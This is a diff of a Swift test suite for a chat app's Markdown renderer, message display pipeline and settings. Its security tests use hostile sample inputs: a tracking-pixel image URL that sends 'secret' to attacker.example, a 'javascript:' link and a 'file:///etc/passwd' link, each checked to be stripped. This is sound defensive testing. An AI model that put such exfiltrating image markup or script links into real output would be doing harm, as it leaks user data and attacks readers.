@@ -11,6 +11,7 @@ import MLXLMCommon
 import SwiftUI
 import SwiftData
 import WebKit
+import UIKit
 import FoundationModels
 @testable import ChatLLM
 
@@ -2809,42 +2810,340 @@ struct ChatLLMTests {
         #expect(try await renderer.webView.evaluateJavaScript("Array.from(document.querySelectorAll('code')).map(e => e.textContent)") as? [String] == ["first_name", #"\(literal\)"#])
     }
 
-    @Test func ordinaryParagraphsUseNativeMarkdownRenderer() {
-        #expect(!RichTextFeatureDetector.requiresAdvancedRendering("First paragraph.\n\nSecond paragraph."))
-        #expect(!RichTextFeatureDetector.requiresAdvancedRendering(
-            "The basic plan costs $5 per month and the pro plan costs $12 per month."
-        ))
-        #expect(RichTextFeatureDetector.requiresAdvancedRendering(#"A formula: \(x^2\)"#))
-        #expect(RichTextFeatureDetector.requiresAdvancedRendering("A display formula: $$x^2$$"))
-    }
-
     @Test func nativeLatexProcessorPreservesDollarAmounts() {
         let input = "The basic plan costs $5 per month and the pro plan costs $12 per month."
 
         #expect(LatexProcessor.process(input) == input)
     }
 
-    @Test func blockMarkdownUsesAdvancedRenderer() {
-        #expect(RichTextFeatureDetector.requiresAdvancedRendering("## Heading"))
-        #expect(RichTextFeatureDetector.requiresAdvancedRendering("- First\n- Second"))
-        #expect(RichTextFeatureDetector.requiresAdvancedRendering("> Quoted text"))
-        #expect(RichTextFeatureDetector.requiresAdvancedRendering(">Quote"))
-        #expect(RichTextFeatureDetector.requiresAdvancedRendering("1) First\n2) Second"))
-        #expect(RichTextFeatureDetector.requiresAdvancedRendering("Heading\n==="))
-        #expect(RichTextFeatureDetector.requiresAdvancedRendering("    first_name = 1"))
-        #expect(RichTextFeatureDetector.requiresAdvancedRendering("$$\nx^2\n$$"))
-    }
+    // MARK: - Markdown routing
 
-    @Test func richMarkdownRendererBlocksRemoteResourceLoads() {
-        #expect(RichTextFeatureDetector.requiresAdvancedRendering(
-            "![tracking pixel](https://attacker.example/pixel?q=secret)"
-        ))
-        #expect(RichTextFeatureDetector.requiresAdvancedRendering(
-            "![tracking pixel][remote]\n\n[remote]: https://attacker.example/pixel"
-        ))
+    @Test func mathDocumentStillBlocksRemoteResourceLoads() {
+        // The KaTeX document is now reached only by math, but model output still
+        // arrives there as data and must not be able to fetch anything remote.
         #expect(RichMarkdownRenderingPolicy.disabledMarkdownRules.contains("image"))
         #expect(RichMarkdownRenderingPolicy.contentSecurityPolicy.contains("default-src 'none'"))
         #expect(RichMarkdownRenderingPolicy.contentSecurityPolicy.contains("img-src data:"))
+    }
+
+
+    @Test func blockMarkdownUsesNativeRenderer() {
+        // Headings, lists, quotes, code, rules and tables are all laid out
+        // natively now. None of them may pull in the KaTeX document.
+        #expect(!RichTextFeatureDetector.requiresAdvancedRendering("## Heading"))
+        #expect(!RichTextFeatureDetector.requiresAdvancedRendering("- First\n- Second"))
+        #expect(!RichTextFeatureDetector.requiresAdvancedRendering("> Quoted text"))
+        #expect(!RichTextFeatureDetector.requiresAdvancedRendering(">Quote"))
+        #expect(!RichTextFeatureDetector.requiresAdvancedRendering("1) First\n2) Second"))
+        #expect(!RichTextFeatureDetector.requiresAdvancedRendering("Heading\n==="))
+        #expect(!RichTextFeatureDetector.requiresAdvancedRendering("    first_name = 1"))
+        #expect(!RichTextFeatureDetector.requiresAdvancedRendering("| A | B |\n|---|---|\n| 1 | 2 |"))
+        #expect(!RichTextFeatureDetector.requiresAdvancedRendering("---"))
+        #expect(!RichTextFeatureDetector.requiresAdvancedRendering("```swift\nlet x = 1\n```"))
+    }
+
+    @Test func mathStillUsesAdvancedRenderer() {
+        #expect(RichTextFeatureDetector.requiresAdvancedRendering(#"A formula: \(x^2\)"#))
+        #expect(RichTextFeatureDetector.requiresAdvancedRendering("A display formula: $$x^2$$"))
+        #expect(RichTextFeatureDetector.requiresAdvancedRendering(#"\[ x^2 \]"#))
+        #expect(RichTextFeatureDetector.requiresAdvancedRendering(#"\begin{align} x \end{align}"#))
+        #expect(RichTextFeatureDetector.requiresAdvancedRendering("## Heading\n\nThen $$x^2$$."))
+    }
+
+    @Test func codeSpansAndFencesNeverCountAsMath() {
+        // Swift interpolation is the motivating case: `\(name)` inside a snippet
+        // used to look exactly like inline TeX and spawned a WebView per message.
+        #expect(!RichTextFeatureDetector.requiresAdvancedRendering(
+            "```swift\nprint(\"Hello \\(name)\")\n```"
+        ))
+        #expect(!RichTextFeatureDetector.requiresAdvancedRendering(
+            "~~~swift\nlet total = \"\\(count) items\"\n~~~"
+        ))
+        #expect(!RichTextFeatureDetector.requiresAdvancedRendering(#"Use `\(literal\)` in code."#))
+        // Real math outside a snippet is still honoured.
+        #expect(RichTextFeatureDetector.requiresAdvancedRendering(
+            "```swift\nlet x = \"\\(a)\"\n```\n\nWhich solves $$x^2 = 4$$."
+        ))
+    }
+
+    @Test func ordinaryTextIsNotMistakenForMath() {
+        #expect(!RichTextFeatureDetector.requiresAdvancedRendering("First paragraph.\n\nSecond paragraph."))
+        #expect(!RichTextFeatureDetector.requiresAdvancedRendering(
+            "The basic plan costs $5 per month and the pro plan costs $12 per month."
+        ))
+        #expect(!RichTextFeatureDetector.requiresAdvancedRendering(""))
+    }
+
+    // MARK: - Markdown block parsing
+
+    @Test func parserReadsHeadingsAndParagraphs() {
+        #expect(MarkdownBlockParser.parse("## Heading") == [.heading(level: 2, text: "Heading")])
+        #expect(MarkdownBlockParser.parse("### Heading ###") == [.heading(level: 3, text: "Heading")])
+        #expect(MarkdownBlockParser.parse("####### Too deep") == [.paragraph("####### Too deep")])
+        #expect(MarkdownBlockParser.parse("#NoSpace") == [.paragraph("#NoSpace")])
+        #expect(MarkdownBlockParser.parse("Heading\n===") == [.heading(level: 1, text: "Heading")])
+        #expect(MarkdownBlockParser.parse("Heading\n---") == [.heading(level: 2, text: "Heading")])
+    }
+
+    @Test func parserPreservesSoftLineBreaksInsideParagraphs() {
+        // The chat renders a single newline as a line break, matching how the
+        // bundled document was configured. Paragraph splits stay separate blocks.
+        #expect(MarkdownBlockParser.parse("First line.\nNext line.") == [.paragraph("First line.\nNext line.")])
+        #expect(MarkdownBlockParser.parse("First.\n\nSecond.") == [.paragraph("First."), .paragraph("Second.")])
+    }
+
+    @Test func parserReadsFencedCodeIncludingUnterminatedStreams() {
+        #expect(MarkdownBlockParser.parse("```swift\nlet first_name = 1\n```")
+                == [.codeBlock(language: "swift", code: "let first_name = 1")])
+        #expect(MarkdownBlockParser.parse("```\nplain\n```")
+                == [.codeBlock(language: nil, code: "plain")])
+        // A half-streamed fence must already render as code, not as a paragraph.
+        #expect(MarkdownBlockParser.parse("```swift\nlet first_name = 1")
+                == [.codeBlock(language: "swift", code: "let first_name = 1")])
+        #expect(MarkdownBlockParser.parse("    indented = 1")
+                == [.codeBlock(language: nil, code: "indented = 1")])
+        // Blank lines inside a fence are content, not block separators.
+        #expect(MarkdownBlockParser.parse("```\na\n\nb\n```")
+                == [.codeBlock(language: nil, code: "a\n\nb")])
+    }
+
+    @Test func parserReadsListsWithNestingAndLooseness() {
+        let tight = MarkdownBlockParser.parse("- First\n- Second")
+        #expect(tight == [.list(MarkdownList(isOrdered: false, start: 1, isLoose: false, items: [
+            MarkdownListItem(blocks: [.paragraph("First")]),
+            MarkdownListItem(blocks: [.paragraph("Second")])
+        ]))])
+
+        let loose = MarkdownBlockParser.parse("- First\n\n- Second")
+        #expect(loose == [.list(MarkdownList(isOrdered: false, start: 1, isLoose: true, items: [
+            MarkdownListItem(blocks: [.paragraph("First")]),
+            MarkdownListItem(blocks: [.paragraph("Second")])
+        ]))])
+
+        let ordered = MarkdownBlockParser.parse("3. Third\n4. Fourth")
+        #expect(ordered == [.list(MarkdownList(isOrdered: true, start: 3, isLoose: false, items: [
+            MarkdownListItem(blocks: [.paragraph("Third")]),
+            MarkdownListItem(blocks: [.paragraph("Fourth")])
+        ]))])
+
+        let nested = MarkdownBlockParser.parse("- First\n    - Nested\n- Second")
+        #expect(nested == [.list(MarkdownList(isOrdered: false, start: 1, isLoose: false, items: [
+            MarkdownListItem(blocks: [
+                .paragraph("First"),
+                .list(MarkdownList(isOrdered: false, start: 1, isLoose: false, items: [
+                    MarkdownListItem(blocks: [.paragraph("Nested")])
+                ]))
+            ]),
+            MarkdownListItem(blocks: [.paragraph("Second")])
+        ]))])
+    }
+
+    @Test func parserAbsorbsWrappedListItemLines() {
+        // Models routinely wrap a long bullet onto the next line without
+        // indenting it. That line belongs to the item, not to a new paragraph.
+        #expect(MarkdownBlockParser.parse("- First line\ncontinued here\n- Second")
+                == [.list(MarkdownList(isOrdered: false, start: 1, isLoose: false, items: [
+                    MarkdownListItem(blocks: [.paragraph("First line\ncontinued here")]),
+                    MarkdownListItem(blocks: [.paragraph("Second")])
+                ]))])
+
+        // An empty item cannot swallow the following line.
+        #expect(MarkdownBlockParser.parse("-\nSeparate paragraph")
+                == [.list(MarkdownList(isOrdered: false, start: 1, isLoose: false, items: [
+                    MarkdownListItem(blocks: [])
+                ])), .paragraph("Separate paragraph")])
+    }
+
+    @Test func parserKeepsMultiBlockListItemsWithTheirMarker() {
+        let parsed = MarkdownBlockParser.parse("""
+        1. Install it:
+
+           ```sh
+           brew install thing
+           ```
+
+        2. Run it.
+        """)
+
+        #expect(parsed == [.list(MarkdownList(isOrdered: true, start: 1, isLoose: true, items: [
+            MarkdownListItem(blocks: [
+                .paragraph("Install it:"),
+                .codeBlock(language: "sh", code: "brew install thing")
+            ]),
+            MarkdownListItem(blocks: [.paragraph("Run it.")])
+        ]))])
+    }
+
+    @Test func parserReadsBlockQuotesAndThematicBreaks() {
+        #expect(MarkdownBlockParser.parse("> Quoted text") == [.blockQuote([.paragraph("Quoted text")])])
+        #expect(MarkdownBlockParser.parse(">Quote") == [.blockQuote([.paragraph("Quote")])])
+        #expect(MarkdownBlockParser.parse("> One\n> - Item")
+                == [.blockQuote([
+                    .paragraph("One"),
+                    .list(MarkdownList(isOrdered: false, start: 1, isLoose: false, items: [
+                        MarkdownListItem(blocks: [.paragraph("Item")])
+                    ]))
+                ])])
+        #expect(MarkdownBlockParser.parse("***") == [.thematicBreak])
+        #expect(MarkdownBlockParser.parse("Above\n\n---\n\nBelow")
+                == [.paragraph("Above"), .thematicBreak, .paragraph("Below")])
+    }
+
+    @Test func parserReadsTablesWithAlignmentAndRaggedRows() {
+        let parsed = MarkdownBlockParser.parse("""
+        | Name | Count | Note |
+        |:-----|------:|:----:|
+        | a | 1 | ok |
+        | b | 2 |
+        """)
+
+        #expect(parsed == [.table(MarkdownTable(
+            headers: ["Name", "Count", "Note"],
+            alignments: [.leading, .trailing, .center],
+            rows: [["a", "1", "ok"], ["b", "2", ""]]
+        ))])
+    }
+
+    @Test func parserHonorsEscapedPipesInTableCells() {
+        let parsed = MarkdownBlockParser.parse("| A | B |\n|---|---|\n| a \\| b | c |")
+
+        #expect(parsed == [.table(MarkdownTable(
+            headers: ["A", "B"],
+            alignments: [.leading, .leading],
+            rows: [["a | b", "c"]]
+        ))])
+    }
+
+    @Test func parserRejectsPipeTextThatIsNotATable() {
+        #expect(MarkdownBlockParser.parse("a | b | c") == [.paragraph("a | b | c")])
+    }
+
+    @Test func parserToleratesEveryStreamedPrefix() {
+        // Bubbles re-parse on each token, so no prefix of a realistic answer may
+        // trap the parser or silently drop the text the model has produced.
+        let document = """
+        # Title
+
+        Intro **text** with `code`.
+
+        - First
+            - Nested
+        - Second
+
+        > Note
+
+        | A | B |
+        |---|---|
+        | 1 | 2 |
+
+        ```swift
+        let first_name = 1
+        ```
+
+        Done.
+        """
+
+        for prefixLength in 1...document.count {
+            let prefix = String(document.prefix(prefixLength))
+            let blocks = MarkdownBlockParser.parse(prefix)
+            #expect(!blocks.isEmpty)
+        }
+
+        #expect(MarkdownBlockParser.parse(document).count == 7)
+    }
+
+    // MARK: - Markdown inline rendering
+
+    @Test func nativeRendererReducesImagesToAltTextWithoutTheirURL() {
+        let inline = "![tracking pixel](https://attacker.example/pixel?q=secret)"
+        let sanitized = MarkdownInlineRenderer.sanitizedSource(inline)
+        #expect(sanitized == "tracking pixel")
+
+        let rendered = MarkdownInlineRenderer.attributed(inline, fontSize: 16)
+        #expect(!String(rendered.characters).contains("attacker.example"))
+        #expect(rendered.runs.allSatisfy { $0.link == nil })
+    }
+
+    @Test func nativeRendererDropsReferenceImagesAndTheirDefinitions() {
+        #expect(MarkdownInlineRenderer.sanitizedSource("![tracking pixel][remote]") == "tracking pixel")
+
+        let definition = "[remote]: https://attacker.example/pixel"
+        #expect(MarkdownInlineRenderer.sanitizedSource(definition).isEmpty)
+
+        let blocks = MarkdownBlockParser.parse("![tracking pixel][remote]\n\n[remote]: https://attacker.example/pixel")
+        let text = blocks.map { block -> String in
+            guard case let .paragraph(value) = block else { return "" }
+            return String(MarkdownInlineRenderer.attributed(value, fontSize: 16).characters)
+        }.joined()
+        #expect(!text.contains("attacker.example"))
+        #expect(text.contains("tracking pixel"))
+    }
+
+    @Test func nativeRendererKeepsWebLinksAndStripsOtherSchemes() {
+        let rendered = MarkdownInlineRenderer.attributed(
+            "[ok](https://example.com) and [bad](javascript:alert(1)) and [file](file:///etc/passwd)",
+            fontSize: 16
+        )
+
+        let links = rendered.runs.compactMap { $0.link }
+        #expect(links.allSatisfy { $0.scheme == "http" || $0.scheme == "https" })
+        #expect(links.contains { $0.absoluteString == "https://example.com" })
+    }
+
+    @Test func nativeRendererStylesInlineCodeRuns() {
+        let rendered = MarkdownInlineRenderer.attributed("Use `first_name` here.", fontSize: 16)
+
+        #expect(String(rendered.characters) == "Use first_name here.")
+        #expect(rendered.runs.contains {
+            $0.inlinePresentationIntent?.contains(.code) == true && $0.font != nil
+        })
+    }
+
+    @Test func nativeRendererPreservesEmphasisAcrossStreamedPrefixes() {
+        let source = "First **bold** word.\nNext line with _italic_ text."
+        for prefixLength in 1...source.count {
+            let rendered = MarkdownInlineRenderer.attributed(String(source.prefix(prefixLength)), fontSize: 16)
+            #expect(!String(rendered.characters).isEmpty)
+        }
+
+        let rendered = MarkdownInlineRenderer.attributed(source, fontSize: 16)
+        #expect(String(rendered.characters) == "First bold word.\nNext line with italic text.")
+        #expect(rendered.runs.contains { $0.inlinePresentationIntent?.contains(.stronglyEmphasized) == true })
+        #expect(rendered.runs.contains { $0.inlinePresentationIntent?.contains(.emphasized) == true })
+    }
+
+    // MARK: - Markdown caches
+
+    @Test func blockCacheReturnsStableResultsAndStaysBounded() {
+        MarkdownBlockCache.removeAll()
+        let source = "## Heading\n\n- First\n- Second"
+        #expect(MarkdownBlockCache.blocks(for: source) == MarkdownBlockParser.parse(source))
+        #expect(MarkdownBlockCache.blocks(for: source) == MarkdownBlockParser.parse(source))
+
+        for index in 0..<200 {
+            _ = MarkdownBlockCache.blocks(for: "Message \(index)")
+        }
+        // Still correct after eviction has certainly happened.
+        #expect(MarkdownBlockCache.blocks(for: source) == MarkdownBlockParser.parse(source))
+    }
+
+    @Test func heightCacheRoundTripsAndStaysBounded() {
+        MarkdownHeightCache.removeAll()
+        let key = MarkdownHeightCache.Key(text: #"$$x^2$$"#, fontSize: 16)
+        #expect(MarkdownHeightCache.height(for: key) == nil)
+
+        MarkdownHeightCache.store(120, for: key)
+        #expect(MarkdownHeightCache.height(for: key) == 120)
+
+        // A degenerate measurement must never be cached as a real height.
+        MarkdownHeightCache.store(1, for: key)
+        #expect(MarkdownHeightCache.height(for: key) == 120)
+
+        for index in 0..<200 {
+            MarkdownHeightCache.store(CGFloat(index + 2), for: .init(text: "m\(index)", fontSize: 16))
+        }
+        #expect(MarkdownHeightCache.height(for: .init(text: "m199", fontSize: 16)) == 201)
+        #expect(MarkdownHeightCache.height(for: .init(text: "m0", fontSize: 16)) == nil)
     }
 
     @Test func webSearchBridgeReturnsRecoverableErrorForMissingQueryArgument() async throws {
@@ -2935,6 +3234,608 @@ struct ChatLLMTests {
 
         #expect(urls.destination.standardizedFileURL.path == "/tmp/models/nested/config.json")
         #expect(urls.temporary.standardizedFileURL.path == "/tmp/models/nested/config.json.download")
+    }
+
+    // MARK: - Message display pipeline
+
+    @Test func displayTextStripsThinkingTagsAndFinalAnswerPrefix() {
+        let message = Message(
+            role: .assistant,
+            text: "<think>weighing the options</think>Final answer: Paris is the capital.",
+            order: 0
+        )
+
+        #expect(message.displayText == "Paris is the capital.")
+    }
+
+    @Test func displayTextStripsThinkingTagsRegardlessOfSpellingOrCase() {
+        for opening in ["<think>", "<thinking>", "<THINK>", "<Thinking>"] {
+            let closing = opening
+                .replacingOccurrences(of: "<", with: "</")
+            let message = Message(role: .assistant, text: "\(opening)hidden\(closing)Visible.", order: 0)
+            #expect(message.displayText == "Visible.")
+        }
+    }
+
+    @Test func displayTextUnwrapsAnswerTags() {
+        let message = Message(role: .assistant, text: "<answer>The result is 42.</answer>", order: 0)
+        #expect(message.displayText == "The result is 42.")
+    }
+
+    @Test func displayTextHidesImageContextAndAnalysisBlocks() {
+        let hidden = Message(
+            role: .user,
+            text: "What is this?[HIDDEN_IMAGE_CONTEXT]a cat on a mat[/HIDDEN_IMAGE_CONTEXT]",
+            order: 0
+        )
+        #expect(hidden.displayText == "What is this?")
+
+        let analysed = Message(
+            role: .user,
+            text: """
+            --- Image Analysis Data ---
+            objects: cat, mat
+            --- End Image Analysis ---
+            User's question: Describe the photo.
+            """,
+            order: 0
+        )
+        #expect(analysed.displayText == "Describe the photo.")
+    }
+
+    @Test func displayTextDropsTheTrailingImageAnalysisInstruction() {
+        let message = Message(
+            role: .user,
+            text: """
+            --- Image Analysis Data ---
+            objects: cat
+            --- User Question ---
+            Describe the photo.
+
+            Please respond based on the image analysis data above.
+            """,
+            order: 0
+        )
+
+        #expect(message.displayText == "Describe the photo.")
+    }
+
+    @Test func displayTextPrefersFinalAnswerOnlyForReasoningAssistants() {
+        let reasoning = Message(
+            role: .assistant,
+            text: "raw stream",
+            order: 0,
+            reasoning: "thinking",
+            finalAnswer: "polished answer",
+            isReasoningMode: true
+        )
+        #expect(reasoning.displayText == "polished answer")
+
+        // A user message in a reasoning chat still shows its own text.
+        let user = Message(
+            role: .user,
+            text: "raw stream",
+            order: 1,
+            finalAnswer: "polished answer",
+            isReasoningMode: true
+        )
+        #expect(user.displayText == "raw stream")
+
+        // So does an assistant outside reasoning mode.
+        let plain = Message(
+            role: .assistant,
+            text: "raw stream",
+            order: 2,
+            finalAnswer: "polished answer",
+            isReasoningMode: false
+        )
+        #expect(plain.displayText == "raw stream")
+    }
+
+    @Test func displayTextCacheInvalidatesWhenAnyContentFieldChanges() {
+        // displayText memoises on a hash of text + reasoning + finalAnswer.
+        // Every one of those fields has to participate, or an edit renders stale.
+        let message = Message(
+            role: .assistant,
+            text: "first",
+            order: 0,
+            reasoning: "a",
+            finalAnswer: "first answer",
+            isReasoningMode: true
+        )
+        #expect(message.displayText == "first answer")
+
+        message.finalAnswer = "second answer"
+        #expect(message.displayText == "second answer")
+
+        message.isReasoningMode = false
+        message.text = "third"
+        #expect(message.displayText == "third")
+
+        message.reasoning = "b"
+        #expect(message.displayText == "third")
+    }
+
+    @Test func contentLengthMeasuresWhatTheReaderSeesNotRawStorage() {
+        let message = Message(
+            role: .assistant,
+            text: "<think>a very long hidden deliberation</think>Hi.",
+            order: 0
+        )
+
+        #expect(message.displayText == "Hi.")
+        #expect(message.contentLength == 3)
+        #expect(message.contentLength < message.text.count)
+    }
+
+    @Test func hasContentReflectsAnyPopulatedField() {
+        #expect(!Message(role: .assistant, text: "", order: 0).hasContent)
+        #expect(Message(role: .assistant, text: "x", order: 0).hasContent)
+        #expect(Message(role: .assistant, text: "", order: 0, reasoning: "x").hasContent)
+        #expect(Message(role: .assistant, text: "", order: 0, finalAnswer: "x").hasContent)
+    }
+
+    @Test func userVisibleTextRemovesSourcesBlocks() {
+        let message = Message(
+            role: .assistant,
+            text: "The answer.\n\n<sources>1. https://example.com</sources>",
+            order: 0
+        )
+
+        #expect(message.userVisibleText == "The answer.")
+        #expect(message.displayText.contains("<sources>"))
+    }
+
+    // MARK: - Sources extraction
+
+    @Test func extractSourcesBlocksSeparatesVisibleTextFromSources() {
+        let (visible, sources) = "Answer.\n\n<sources>1. https://a.example</sources>".extractSourcesBlocks()
+
+        #expect(visible == "Answer.")
+        #expect(sources == "1. https://a.example")
+    }
+
+    @Test func extractSourcesBlocksJoinsMultipleAndIgnoresEmptyOnes() {
+        let (visible, sources) = "A<sources>one</sources>B<sources>  </sources>C<sources>two</sources>"
+            .extractSourcesBlocks()
+
+        #expect(visible == "ABC")
+        #expect(sources == "one\n\ntwo")
+    }
+
+    @Test func extractSourcesBlocksHandlesAbsentAndSourcesOnlyText() {
+        let plain = "Just an answer.".extractSourcesBlocks()
+        #expect(plain.visible == "Just an answer.")
+        #expect(plain.sources == nil)
+
+        let onlySources = "<sources>1. https://a.example</sources>".extractSourcesBlocks()
+        #expect(onlySources.visible.isEmpty)
+        #expect(onlySources.sources == "1. https://a.example")
+    }
+
+    // MARK: - Message ordering
+
+    @Test func messagesSortByOrderThenCreationDate() {
+        let base = Date(timeIntervalSince1970: 1_000)
+        let second = Message(role: .user, text: "second", createdAt: base.addingTimeInterval(10), order: 1)
+        let first = Message(role: .user, text: "first", createdAt: base.addingTimeInterval(20), order: 0)
+        let tieEarly = Message(role: .user, text: "tie-early", createdAt: base, order: 1)
+
+        let sorted = [second, first, tieEarly].sortedByOrder
+
+        #expect(sorted.map(\.text) == ["first", "tie-early", "second"])
+    }
+
+    // MARK: - JSON-backed message properties
+
+    @Test func searchInvocationsRoundTripAndMirrorTheFirstQuery() {
+        let message = Message(role: .assistant, text: "", order: 0)
+        message.searchInvocations = [
+            SearchInvocation(query: "weather today", results: "sunny"),
+            SearchInvocation(query: "weather tomorrow", results: "rain")
+        ]
+
+        #expect(message.searchInvocations?.map(\.query) == ["weather today", "weather tomorrow"])
+        // The legacy single-query field has to track the first invocation.
+        #expect(message.searchQuery == "weather today")
+        #expect(message.searchInvocationsJSON != nil)
+    }
+
+    @Test func clearingSearchInvocationsAlsoClearsTheLegacyQuery() {
+        let message = Message(role: .assistant, text: "", order: 0)
+        message.searchInvocations = [SearchInvocation(query: "q", results: "r")]
+
+        message.searchInvocations = []
+        #expect(message.searchInvocations == nil)
+        #expect(message.searchQuery == nil)
+
+        message.searchInvocations = [SearchInvocation(query: "q", results: "r")]
+        message.searchInvocations = nil
+        #expect(message.searchInvocations == nil)
+        #expect(message.searchQuery == nil)
+    }
+
+    @Test func corruptSearchInvocationJSONDecodesToNilInsteadOfThrowing() {
+        let message = Message(role: .assistant, text: "", order: 0)
+        message.searchInvocationsJSON = "{not json"
+
+        #expect(message.searchInvocations == nil)
+    }
+
+    @Test func reasoningStepsRoundTripThroughJSON() {
+        let message = Message(role: .assistant, text: "", order: 0)
+        let steps = [
+            ReasoningStep(stepNumber: 1, title: "Read", content: "Read the question."),
+            ReasoningStep(stepNumber: 2, title: nil, content: "Answer it.")
+        ]
+        message.reasoningSteps = steps
+
+        #expect(message.reasoningSteps?.map(\.stepNumber) == [1, 2])
+        #expect(message.reasoningSteps?.map(\.content) == ["Read the question.", "Answer it."])
+        #expect(message.reasoningSteps?[1].title == nil)
+
+        message.reasoningSteps = nil
+        #expect(message.reasoningSteps == nil)
+    }
+
+    // MARK: - Conversation
+
+    @Test func searchableVisibleTextSkipsSystemMessagesAndSources() {
+        let conversation = Conversation(title: "Trip")
+        conversation.messages = [
+            Message(role: .system, text: "system prompt", order: 0, conversation: conversation),
+            Message(role: .assistant, text: "Paris.\n\n<sources>1. https://a.example</sources>",
+                    order: 2, conversation: conversation),
+            Message(role: .user, text: "Capital of France?", order: 1, conversation: conversation),
+            Message(role: .assistant, text: "   ", order: 3, conversation: conversation)
+        ]
+
+        #expect(conversation.searchableVisibleText == "Capital of France?\nParis.")
+    }
+
+    // MARK: - Settings
+
+    @Test func settingsLoadFallsBackToDocumentedDefaults() throws {
+        let defaults = try makeScratchDefaults(#function)
+
+        let loaded = AppSettingsDraft.load(from: defaults)
+
+        #expect(loaded.appAppearance == "system")
+        #expect(loaded.appLanguage == "en")
+        #expect(loaded.messageFontSize == 16.0)
+        #expect(loaded.autoDeleteDays == 30)
+        #expect(loaded.visionConfidenceThreshold == 0.5)
+        // Haptics default on even though `bool(forKey:)` would say false.
+        #expect(loaded.enableHaptics)
+        #expect(!loaded.sendOnReturn)
+        #expect(!loaded.autoDeleteOldChats)
+    }
+
+    @Test func settingsMigrateTheLegacyDefaultSystemPromptKey() throws {
+        let defaults = try makeScratchDefaults(#function)
+        defaults.set("Be concise.", forKey: AppSettingsKeys.legacyDefaultSystemPrompt)
+
+        let loaded = AppSettingsDraft.load(from: defaults)
+        #expect(loaded.chatPreferences == "Be concise.")
+
+        // Persisting moves it onto the current key and retires the old one.
+        loaded.persist(to: defaults, comparedTo: loaded)
+        #expect(defaults.string(forKey: AppSettingsKeys.chatPreferences) == "Be concise.")
+        #expect(defaults.object(forKey: AppSettingsKeys.legacyDefaultSystemPrompt) == nil)
+    }
+
+    @Test func settingsPersistRoundTripsEveryStoredField() throws {
+        let defaults = try makeScratchDefaults(#function)
+        var draft = AppSettingsDraft.load(from: defaults)
+        let baseline = draft
+
+        draft.chatPreferences = "Answer in German."
+        draft.appAppearance = "dark"
+        draft.appLanguage = "de"
+        draft.sendOnReturn = true
+        draft.enableHaptics = false
+        draft.reasoningModeDefault = true
+        draft.messageFontSize = 20
+        draft.mlxMaxOutputTokens = 768
+        draft.mlxContextWindowTokens = 4_096
+        draft.mlxEnableRotorQuant = false
+        draft.mlxRepetitionPenalty = 1.15
+        draft.autoDeleteOldChats = true
+        draft.autoDeleteDays = 7
+        draft.developerModeEnabled = true
+        draft.disableRAMPrecautions = true
+        draft.visionConfidenceThreshold = 0.8
+        draft.disableToolCalls = true
+
+        draft.persist(to: defaults, comparedTo: baseline)
+
+        var reloaded = AppSettingsDraft.load(from: defaults)
+        // The key lives in the Keychain rather than this scratch domain.
+        reloaded.tavilyApiKey = draft.tavilyApiKey
+        #expect(reloaded == draft)
+    }
+
+    @Test func mlxTuningPreferencesClampToTheirSupportedRange() throws {
+        let defaults = try makeScratchDefaults(#function)
+
+        // Output-token budget: 0 means "no limit", anything else lands in 512...1024.
+        #expect(defaults.mlxMaxOutputTokens == 0)
+        defaults.mlxMaxOutputTokens = 2_048
+        #expect(defaults.mlxMaxOutputTokens == 1_024)
+        defaults.mlxMaxOutputTokens = 100
+        #expect(defaults.mlxMaxOutputTokens == 512)
+        #expect(defaults.mlxMaxOutputTokensLimit == 512)
+        defaults.mlxMaxOutputTokens = 0
+        #expect(defaults.mlxMaxOutputTokens == 0)
+        #expect(defaults.mlxMaxOutputTokensLimit == nil)
+
+        // Repetition penalty lives in 1.0...1.5, and 1.0 reads back as "off".
+        #expect(defaults.mlxRepetitionPenalty == 1.0)
+        defaults.mlxRepetitionPenalty = 2.0
+        #expect(defaults.mlxRepetitionPenalty == 1.5)
+        #expect(defaults.mlxRepetitionPenaltyValue == Float(1.5))
+        defaults.mlxRepetitionPenalty = 0.5
+        #expect(defaults.mlxRepetitionPenalty == 1.0)
+        #expect(defaults.mlxRepetitionPenaltyValue == nil)
+
+        // The context window defers to the device maximum until it is set,
+        // then stays inside 512...deviceMaximum.
+        #expect(defaults.mlxContextWindowTokens(deviceMaximum: 8_192) == 8_192)
+        defaults.set(100, forKey: AppSettingsKeys.mlxContextWindowTokens)
+        #expect(defaults.mlxContextWindowTokens(deviceMaximum: 8_192) == 512)
+        defaults.set(99_999, forKey: AppSettingsKeys.mlxContextWindowTokens)
+        #expect(defaults.mlxContextWindowTokens(deviceMaximum: 8_192) == 8_192)
+        defaults.set(4_096, forKey: AppSettingsKeys.mlxContextWindowTokens)
+        #expect(defaults.mlxContextWindowTokens(deviceMaximum: 8_192) == 4_096)
+    }
+
+    @Test func settingsDoNotRoundTripAnOutOfRangeOutputTokenBudget() throws {
+        // Worth stating plainly: this field is the one place where what you
+        // save and what you load back differ, because the store clamps it.
+        let defaults = try makeScratchDefaults(#function)
+        let baseline = AppSettingsDraft.load(from: defaults)
+        var draft = baseline
+        draft.mlxMaxOutputTokens = 4_096
+
+        draft.persist(to: defaults, comparedTo: baseline)
+
+        #expect(AppSettingsDraft.load(from: defaults).mlxMaxOutputTokens == 1_024)
+    }
+
+    @Test func settingsPersistOnlyWritesKeysThatActuallyChanged() throws {
+        let defaults = try makeScratchDefaults(#function)
+        let baseline = AppSettingsDraft.load(from: defaults)
+        var draft = baseline
+        draft.messageFontSize = 19
+
+        draft.persist(to: defaults, comparedTo: baseline)
+
+        #expect(defaults.object(forKey: AppSettingsKeys.messageFontSize) as? Double == 19)
+        // Untouched preferences must not be materialised, so their defaults
+        // keep applying instead of being frozen at today's values.
+        #expect(defaults.object(forKey: AppSettingsKeys.appAppearance) == nil)
+        #expect(defaults.object(forKey: AppSettingsKeys.developerModeEnabled) == nil)
+        #expect(defaults.object(forKey: AppSettingsKeys.autoDeleteDays) == nil)
+    }
+
+    @Test func settingsResetReturnsEveryFieldToItsDefault() {
+        var draft = AppSettingsDraft.defaults()
+        draft.messageFontSize = 22
+        draft.developerModeEnabled = true
+
+        draft.resetToDefaults()
+
+        #expect(draft == AppSettingsDraft.defaults())
+    }
+
+    // MARK: - Attachments
+
+    @Test func attachmentStoresAContainerAgnosticFileName() {
+        let attachment = MessageAttachment(
+            type: .image,
+            fileURL: URL(fileURLWithPath: "/var/mobile/Containers/Data/Application/OLD/Documents/Attachments/pic.jpg"),
+            fileName: "pic.jpg"
+        )
+
+        // Only the file name survives; the old container path must not.
+        #expect(!attachment.fileURL.path.contains("OLD"))
+        #expect(attachment.fileURL.lastPathComponent == "pic.jpg")
+    }
+
